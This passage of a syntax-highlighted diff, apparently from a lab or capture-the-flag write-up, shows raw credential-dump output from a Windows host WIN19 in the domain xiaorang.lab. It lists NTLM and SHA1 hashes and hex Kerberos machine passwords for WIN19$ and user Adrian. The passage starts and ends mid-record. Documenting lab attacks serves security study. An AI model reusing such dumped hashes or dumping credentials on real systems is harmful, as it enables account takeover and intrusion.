+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">         * SHA1     : ef0cf040ec9a0d7ada83fabfba0e44bc421442bc
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">         * Password : db 7f 9c d2 2b fa de 0a 9f <span class="m">71</span> <span class="m">77</span> <span class="m">11</span> <span class="m">54</span> <span class="m">59</span> <span class="nb">fc</span> <span class="m">86</span> 9f d5 b8 1d <span class="m">12</span> ff <span class="m">70</span> a2 f3 e1 1a <span class="m">67</span> 0f <span class="m">50</span> db <span class="m">41</span> ad 0b <span class="m">25</span> b1 <span class="m">63</span> <span class="m">42</span> <span class="m">05</span> 3a 0f 5f fe 8a <span class="m">70</span> b4 b4 6c <span class="m">07</span> <span class="m">05</span> <span class="m">05</span> a1 a1 <span class="m">08</span> a5 <span class="m">56</span> e7 <span class="m">50</span> <span class="m">96</span> 8c <span class="m">46</span> 9a ee <span class="m">91</span> 0b <span class="m">89</span> 6a <span class="m">47</span> 4a <span class="m">18</span> c3 4f f0 ca <span class="m">77</span> <span class="m">76</span> <span class="m">13</span> <span class="m">70</span> <span class="m">10</span> <span class="m">62</span> <span class="m">45</span> d7 fe b8 <span class="m">76</span> <span class="m">81</span> <span class="nb">cd</span> 9e cc ae a1 0e c7 <span class="m">21</span> <span class="m">17</span> fb 5e ef 3e f9 a0 4b 8b <span class="m">44</span> 8a 1f a7 7a <span class="m">63</span> <span class="m">66</span> <span class="m">62</span> 4c 8b <span class="m">12</span> b2 <span class="m">31</span> <span class="m">96</span> <span class="m">30</span> <span class="m">49</span> c0 <span class="m">98</span> 6a 6f <span class="m">39</span> 3c bb <span class="m">75</span> <span class="m">96</span> <span class="m">83</span> <span class="m">24</span> b1 b2 <span class="m">83</span> <span class="m">88</span> <span class="m">27</span> 9e ce <span class="nb">cd</span> e0 2d 9a <span class="m">77</span> <span class="m">93</span> <span class="m">78</span> 5f f5 7b d1 8c <span class="m">39</span> 8b <span class="m">68</span> 8e c7 <span class="m">87</span> <span class="m">92</span> <span class="m">97</span> e4 2a <span class="m">77</span> <span class="m">99</span> db 8a 5f 1b <span class="m">93</span> cb ca f8 <span class="m">42</span> <span class="m">65</span> 0b <span class="m">49</span> 7d <span class="m">76</span> b2 3b <span class="nb">fc</span> <span class="m">82</span> c8 <span class="m">32</span> a1 2f bd c0 <span class="m">48</span> b3 d8 b6 <span class="m">72</span> e5 <span class="m">80</span> b0 9a bf <span class="m">02</span> <span class="nb">fc</span> eb 7d <span class="m">24</span> <span class="m">19</span> f0 <span class="m">17</span> <span class="m">46</span> <span class="m">53</span> <span class="m">01</span> ee <span class="m">81</span> 7e 4b e4 <span class="m">14</span> <span class="m">23</span> <span class="m">59</span> 3b <span class="m">05</span> <span class="m">18</span> <span class="nb">fc</span> c0 0d <span class="m">04</span> d7 <span class="m">56</span> f6 <span class="m">90</span> 8c ad e4 <span class="m">67</span> 0c b8 <span class="m">50</span> f6 <span class="m">98</span> ae 1f e4 c5 <span class="m">49</span> d6
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">3104544</span> <span class="o">(</span>00000000:002f5f20<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">3</span>
+</span></span><span class="line"><span class="cl">User Name         : DWM-3
+</span></span><span class="line"><span class="cl">Domain            : Window Manager
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 22:15:47
+</span></span><span class="line"><span class="cl">SID               : S-1-5-90-0-3
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">         * SHA1     : ef0cf040ec9a0d7ada83fabfba0e44bc421442bc
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">         * Password : db 7f 9c d2 2b fa de 0a 9f <span class="m">71</span> <span class="m">77</span> <span class="m">11</span> <span class="m">54</span> <span class="m">59</span> <span class="nb">fc</span> <span class="m">86</span> 9f d5 b8 1d <span class="m">12</span> ff <span class="m">70</span> a2 f3 e1 1a <span class="m">67</span> 0f <span class="m">50</span> db <span class="m">41</span> ad 0b <span class="m">25</span> b1 <span class="m">63</span> <span class="m">42</span> <span class="m">05</span> 3a 0f 5f fe 8a <span class="m">70</span> b4 b4 6c <span class="m">07</span> <span class="m">05</span> <span class="m">05</span> a1 a1 <span class="m">08</span> a5 <span class="m">56</span> e7 <span class="m">50</span> <span class="m">96</span> 8c <span class="m">46</span> 9a ee <span class="m">91</span> 0b <span class="m">89</span> 6a <span class="m">47</span> 4a <span class="m">18</span> c3 4f f0 ca <span class="m">77</span> <span class="m">76</span> <span class="m">13</span> <span class="m">70</span> <span class="m">10</span> <span class="m">62</span> <span class="m">45</span> d7 fe b8 <span class="m">76</span> <span class="m">81</span> <span class="nb">cd</span> 9e cc ae a1 0e c7 <span class="m">21</span> <span class="m">17</span> fb 5e ef 3e f9 a0 4b 8b <span class="m">44</span> 8a 1f a7 7a <span class="m">63</span> <span class="m">66</span> <span class="m">62</span> 4c 8b <span class="m">12</span> b2 <span class="m">31</span> <span class="m">96</span> <span class="m">30</span> <span class="m">49</span> c0 <span class="m">98</span> 6a 6f <span class="m">39</span> 3c bb <span class="m">75</span> <span class="m">96</span> <span class="m">83</span> <span class="m">24</span> b1 b2 <span class="m">83</span> <span class="m">88</span> <span class="m">27</span> 9e ce <span class="nb">cd</span> e0 2d 9a <span class="m">77</span> <span class="m">93</span> <span class="m">78</span> 5f f5 7b d1 8c <span class="m">39</span> 8b <span class="m">68</span> 8e c7 <span class="m">87</span> <span class="m">92</span> <span class="m">97</span> e4 2a <span class="m">77</span> <span class="m">99</span> db 8a 5f 1b <span class="m">93</span> cb ca f8 <span class="m">42</span> <span class="m">65</span> 0b <span class="m">49</span> 7d <span class="m">76</span> b2 3b <span class="nb">fc</span> <span class="m">82</span> c8 <span class="m">32</span> a1 2f bd c0 <span class="m">48</span> b3 d8 b6 <span class="m">72</span> e5 <span class="m">80</span> b0 9a bf <span class="m">02</span> <span class="nb">fc</span> eb 7d <span class="m">24</span> <span class="m">19</span> f0 <span class="m">17</span> <span class="m">46</span> <span class="m">53</span> <span class="m">01</span> ee <span class="m">81</span> 7e 4b e4 <span class="m">14</span> <span class="m">23</span> <span class="m">59</span> 3b <span class="m">05</span> <span class="m">18</span> <span class="nb">fc</span> c0 0d <span class="m">04</span> d7 <span class="m">56</span> f6 <span class="m">90</span> 8c ad e4 <span class="m">67</span> 0c b8 <span class="m">50</span> f6 <span class="m">98</span> ae 1f e4 c5 <span class="m">49</span> d6
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">3103923</span> <span class="o">(</span>00000000:002f5cb3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">3</span>
+</span></span><span class="line"><span class="cl">User Name         : UMFD-3
+</span></span><span class="line"><span class="cl">Domain            : Font Driver Host
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 22:15:47
+</span></span><span class="line"><span class="cl">SID               : S-1-5-96-0-3
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">         * SHA1     : ef0cf040ec9a0d7ada83fabfba0e44bc421442bc
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">         * Password : db 7f 9c d2 2b fa de 0a 9f <span class="m">71</span> <span class="m">77</span> <span class="m">11</span> <span class="m">54</span> <span class="m">59</span> <span class="nb">fc</span> <span class="m">86</span> 9f d5 b8 1d <span class="m">12</span> ff <span class="m">70</span> a2 f3 e1 1a <span class="m">67</span> 0f <span class="m">50</span> db <span class="m">41</span> ad 0b <span class="m">25</span> b1 <span class="m">63</span> <span class="m">42</span> <span class="m">05</span> 3a 0f 5f fe 8a <span class="m">70</span> b4 b4 6c <span class="m">07</span> <span class="m">05</span> <span class="m">05</span> a1 a1 <span class="m">08</span> a5 <span class="m">56</span> e7 <span class="m">50</span> <span class="m">96</span> 8c <span class="m">46</span> 9a ee <span class="m">91</span> 0b <span class="m">89</span> 6a <span class="m">47</span> 4a <span class="m">18</span> c3 4f f0 ca <span class="m">77</span> <span class="m">76</span> <span class="m">13</span> <span class="m">70</span> <span class="m">10</span> <span class="m">62</span> <span class="m">45</span> d7 fe b8 <span class="m">76</span> <span class="m">81</span> <span class="nb">cd</span> 9e cc ae a1 0e c7 <span class="m">21</span> <span class="m">17</span> fb 5e ef 3e f9 a0 4b 8b <span class="m">44</span> 8a 1f a7 7a <span class="m">63</span> <span class="m">66</span> <span class="m">62</span> 4c 8b <span class="m">12</span> b2 <span class="m">31</span> <span class="m">96</span> <span class="m">30</span> <span class="m">49</span> c0 <span class="m">98</span> 6a 6f <span class="m">39</span> 3c bb <span class="m">75</span> <span class="m">96</span> <span class="m">83</span> <span class="m">24</span> b1 b2 <span class="m">83</span> <span class="m">88</span> <span class="m">27</span> 9e ce <span class="nb">cd</span> e0 2d 9a <span class="m">77</span> <span class="m">93</span> <span class="m">78</span> 5f f5 7b d1 8c <span class="m">39</span> 8b <span class="m">68</span> 8e c7 <span class="m">87</span> <span class="m">92</span> <span class="m">97</span> e4 2a <span class="m">77</span> <span class="m">99</span> db 8a 5f 1b <span class="m">93</span> cb ca f8 <span class="m">42</span> <span class="m">65</span> 0b <span class="m">49</span> 7d <span class="m">76</span> b2 3b <span class="nb">fc</span> <span class="m">82</span> c8 <span class="m">32</span> a1 2f bd c0 <span class="m">48</span> b3 d8 b6 <span class="m">72</span> e5 <span class="m">80</span> b0 9a bf <span class="m">02</span> <span class="nb">fc</span> eb 7d <span class="m">24</span> <span class="m">19</span> f0 <span class="m">17</span> <span class="m">46</span> <span class="m">53</span> <span class="m">01</span> ee <span class="m">81</span> 7e 4b e4 <span class="m">14</span> <span class="m">23</span> <span class="m">59</span> 3b <span class="m">05</span> <span class="m">18</span> <span class="nb">fc</span> c0 0d <span class="m">04</span> d7 <span class="m">56</span> f6 <span class="m">90</span> 8c ad e4 <span class="m">67</span> 0c b8 <span class="m">50</span> f6 <span class="m">98</span> ae 1f e4 c5 <span class="m">49</span> d6
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">1230508</span> <span class="o">(</span>00000000:0012c6ac<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : RemoteInteractive from <span class="m">2</span>
+</span></span><span class="line"><span class="cl">User Name         : Adrian
+</span></span><span class="line"><span class="cl">Domain            : WIN19
+</span></span><span class="line"><span class="cl">Logon Server      : WIN19
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 21:06:21
+</span></span><span class="line"><span class="cl">SID               : S-1-5-21-3980434786-725135618-2951588801-1003
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : Adrian
+</span></span><span class="line"><span class="cl">         * Domain   : WIN19
+</span></span><span class="line"><span class="cl">         * NTLM     : 00affd88fa323b00d4560bf9fef0ec2f
+</span></span><span class="line"><span class="cl">         * SHA1     : 8d0c0b15604209440f710869e82085b75a800d79
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : Adrian
+</span></span><span class="line"><span class="cl">         * Domain   : WIN19
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : Adrian
+</span></span><span class="line"><span class="cl">         * Domain   : WIN19
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">1127125</span> <span class="o">(</span>00000000:001132d5<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">2</span>
+</span></span><span class="line"><span class="cl">User Name         : UMFD-2
+</span></span><span class="line"><span class="cl">Domain            : Font Driver Host
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 21:04:49
+</span></span><span class="line"><span class="cl">SID               : S-1-5-96-0-2
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">         * SHA1     : ef0cf040ec9a0d7ada83fabfba0e44bc421442bc
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">         * Password : db 7f 9c d2 2b fa de 0a 9f <span class="m">71</span> <span class="m">77</span> <span class="m">11</span> <span class="m">54</span> <span class="m">59</span> <span class="nb">fc</span> <span class="m">86</span> 9f d5 b8 1d <span class="m">12</span> ff <span class="m">70</span> a2 f3 e1 1a <span class="m">67</span> 0f <span class="m">50</span> db <span class="m">41</span> ad 0b <span class="m">25</span> b1 <span class="m">63</span> <span class="m">42</span> <span class="m">05</span> 3a 0f 5f fe 8a <span class="m">70</span> b4 b4 6c <span class="m">07</span> <span class="m">05</span> <span class="m">05</span> a1 a1 <span class="m">08</span> a5 <span class="m">56</span> e7 <span class="m">50</span> <span class="m">96</span> 8c <span class="m">46</span> 9a ee <span class="m">91</span> 0b <span class="m">89</span> 6a <span class="m">47</span> 4a <span class="m">18</span> c3 4f f0 ca <span class="m">77</span> <span class="m">76</span> <span class="m">13</span> <span class="m">70</span> <span class="m">10</span> <span class="m">62</span> <span class="m">45</span> d7 fe b8 <span class="m">76</span> <span class="m">81</span> <span class="nb">cd</span> 9e cc ae a1 0e c7 <span class="m">21</span> <span class="m">17</span> fb 5e ef 3e f9 a0 4b 8b <span class="m">44</span> 8a 1f a7 7a <span class="m">63</span> <span class="m">66</span> <span class="m">62</span> 4c 8b <span class="m">12</span> b2 <span class="m">31</span> <span class="m">96</span> <span class="m">30</span> <span class="m">49</span> c0 <span class="m">98</span> 6a 6f <span class="m">39</span> 3c bb <span class="m">75</span> <span class="m">96</span> <span class="m">83</span> <span class="m">24</span> b1 b2 <span class="m">83</span> <span class="m">88</span> <span class="m">27</span> 9e ce <span class="nb">cd</span> e0 2d 9a <span class="m">77</span> <span class="m">93</span> <span class="m">78</span> 5f f5 7b d1 8c <span class="m">39</span> 8b <span class="m">68</span> 8e c7 <span class="m">87</span> <span class="m">92</span> <span class="m">97</span> e4 2a <span class="m">77</span> <span class="m">99</span> db 8a 5f 1b <span class="m">93</span> cb ca f8 <span class="m">42</span> <span class="m">65</span> 0b <span class="m">49</span> 7d <span class="m">76</span> b2 3b <span class="nb">fc</span> <span class="m">82</span> c8 <span class="m">32</span> a1 2f bd c0 <span class="m">48</span> b3 d8 b6 <span class="m">72</span> e5 <span class="m">80</span> b0 9a bf <span class="m">02</span> <span class="nb">fc</span> eb 7d <span class="m">24</span> <span class="m">19</span> f0 <span class="m">17</span> <span class="m">46</span> <span class="m">53</span> <span class="m">01</span> ee <span class="m">81</span> 7e 4b e4 <span class="m">14</span> <span class="m">23</span> <span class="m">59</span> 3b <span class="m">05</span> <span class="m">18</span> <span class="nb">fc</span> c0 0d <span class="m">04</span> d7 <span class="m">56</span> f6 <span class="m">90</span> 8c ad e4 <span class="m">67</span> 0c b8 <span class="m">50</span> f6 <span class="m">98</span> ae 1f e4 c5 <span class="m">49</span> d6
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">912531</span> <span class="o">(</span>00000000:000dec93<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Service from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : DefaultAppPool
+</span></span><span class="line"><span class="cl">Domain            : IIS APPPOOL
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 20:56:06
+</span></span><span class="line"><span class="cl">SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">         * SHA1     : ef0cf040ec9a0d7ada83fabfba0e44bc421442bc
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">         * Password : db 7f 9c d2 2b fa de 0a 9f <span class="m">71</span> <span class="m">77</span> <span class="m">11</span> <span class="m">54</span> <span class="m">59</span> <span class="nb">fc</span> <span class="m">86</span> 9f d5 b8 1d <span class="m">12</span> ff <span class="m">70</span> a2 f3 e1 1a <span class="m">67</span> 0f <span class="m">50</span> db <span class="m">41</span> ad 0b <span class="m">25</span> b1 <span class="m">63</span> <span class="m">42</span> <span class="m">05</span> 3a 0f 5f fe 8a <span class="m">70</span> b4 b4 6c <span class="m">07</span> <span class="m">05</span> <span class="m">05</span> a1 a1 <span class="m">08</span> a5 <span class="m">56</span> e7 <span class="m">50</span> <span class="m">96</span> 8c <span class="m">46</span> 9a ee <span class="m">91</span> 0b <span class="m">89</span> 6a <span class="m">47</span> 4a <span class="m">18</span> c3 4f f0 ca <span class="m">77</span> <span class="m">76</span> <span class="m">13</span> <span class="m">70</span> <span class="m">10</span> <span class="m">62</span> <span class="m">45</span> d7 fe b8 <span class="m">76</span> <span class="m">81</span> <span class="nb">cd</span> 9e cc ae a1 0e c7 <span class="m">21</span> <span class="m">17</span> fb 5e ef 3e f9 a0 4b 8b <span class="m">44</span> 8a 1f a7 7a <span class="m">63</span> <span class="m">66</span> <span class="m">62</span> 4c 8b <span class="m">12</span> b2 <span class="m">31</span> <span class="m">96</span> <span class="m">30</span> <span class="m">49</span> c0 <span class="m">98</span> 6a 6f <span class="m">39</span> 3c bb <span class="m">75</span> <span class="m">96</span> <span class="m">83</span> <span class="m">24</span> b1 b2 <span class="m">83</span> <span class="m">88</span> <span class="m">27</span> 9e ce <span class="nb">cd</span> e0 2d 9a <span class="m">77</span> <span class="m">93</span> <span class="m">78</span> 5f f5 7b d1 8c <span class="m">39</span> 8b <span class="m">68</span> 8e c7 <span class="m">87</span> <span class="m">92</span> <span class="m">97</span> e4 2a <span class="m">77</span> <span class="m">99</span> db 8a 5f 1b <span class="m">93</span> cb ca f8 <span class="m">42</span> <span class="m">65</span> 0b <span class="m">49</span> 7d <span class="m">76</span> b2 3b <span class="nb">fc</span> <span class="m">82</span> c8 <span class="m">32</span> a1 2f bd c0 <span class="m">48</span> b3 d8 b6 <span class="m">72</span> e5 <span class="m">80</span> b0 9a bf <span class="m">02</span> <span class="nb">fc</span> eb 7d <span class="m">24</span> <span class="m">19</span> f0 <span class="m">17</span> <span class="m">46</span> <span class="m">53</span> <span class="m">01</span> ee <span class="m">81</span> 7e 4b e4 <span class="m">14</span> <span class="m">23</span> <span class="m">59</span> 3b <span class="m">05</span> <span class="m">18</span> <span class="nb">fc</span> c0 0d <span class="m">04</span> d7 <span class="m">56</span> f6 <span class="m">90</span> 8c ad e4 <span class="m">67</span> 0c b8 <span class="m">50</span> f6 <span class="m">98</span> ae 1f e4 c5 <span class="m">49</span> d6
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">995</span> <span class="o">(</span>00000000:000003e3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Service from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : IUSR
+</span></span><span class="line"><span class="cl">Domain            : NT AUTHORITY
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 20:38:32
+</span></span><span class="line"><span class="cl">SID               : S-1-5-17
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">         * Domain   : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">997</span> <span class="o">(</span>00000000:000003e5<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Service from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : LOCAL SERVICE
+</span></span><span class="line"><span class="cl">Domain            : NT AUTHORITY
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 20:38:30
+</span></span><span class="line"><span class="cl">SID               : S-1-5-19
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">         * Domain   : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">         * Domain   : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">57849</span> <span class="o">(</span>00000000:0000e1f9<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">1</span>
+</span></span><span class="line"><span class="cl">User Name         : DWM-1
+</span></span><span class="line"><span class="cl">Domain            : Window Manager
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 20:38:30
+</span></span><span class="line"><span class="cl">SID               : S-1-5-90-0-1
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 5943c35371c96f19bda7b8e67d041727
+</span></span><span class="line"><span class="cl">         * SHA1     : 5a4dc280e89974fdec8cf1b2b76399d26f39b8f8
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">         * Password : 3a <span class="m">94</span> de 4d <span class="m">87</span> 8e 7d <span class="m">46</span> <span class="m">88</span> ec 9c <span class="m">70</span> fd f0 c5 3e 4c f3 ce 6a <span class="m">80</span> <span class="m">79</span> <span class="m">46</span> c6 2f f9 <span class="m">52</span> 9b 4e 1d <span class="m">90</span> <span class="m">58</span> <span class="m">52</span> 2a 4e ac bf <span class="m">05</span> <span class="m">09</span> <span class="m">08</span> <span class="m">06</span> 0c 4b a9 a2 aa a2 9d db 0d f8 <span class="m">09</span> <span class="m">82</span> c0 6e f4 1b <span class="m">81</span> <span class="m">93</span> <span class="m">59</span> <span class="m">67</span> <span class="m">54</span> de <span class="m">17</span> <span class="m">82</span> d7 c3 <span class="m">82</span> c5 <span class="m">38</span> <span class="m">13</span> 4f d0 <span class="m">55</span> <span class="m">98</span> f6 a2 cc e7 cb <span class="m">85</span> <span class="m">84</span> <span class="m">35</span> 8a 0c 2e 9f d1 <span class="m">90</span> 0c 0f c1 ea 0d d9 c5 d9 7f <span class="m">29</span> a3 <span class="m">57</span> <span class="m">46</span> 6b bf a4 b9 <span class="m">73</span> 9a <span class="m">80</span> <span class="m">84</span> 1d df 3f <span class="m">33</span> f5 <span class="m">16</span> e4 ee 2e d3 <span class="m">88</span> <span class="m">92</span> <span class="nb">cd</span> a5 6e ac e3 eb <span class="m">71</span> <span class="m">43</span> ed 7c b8 a2 9e <span class="m">52</span> d5 <span class="m">31</span> 1c <span class="m">50</span> 9b c8 <span class="m">71</span> <span class="m">03</span> e1 8e 4f <span class="m">60</span> <span class="m">53</span> <span class="m">84</span> <span class="m">13</span> <span class="m">19</span> <span class="m">02</span> e2 8d <span class="m">92</span> 3f dc 0b <span class="m">38</span> 2c <span class="m">13</span> c1 0e 6b <span class="m">64</span> a7 <span class="nb">fc</span> 7a 2a a5 0e e0 b0 <span class="m">66</span> a9 a0 2f 8d 8d <span class="m">40</span> f8 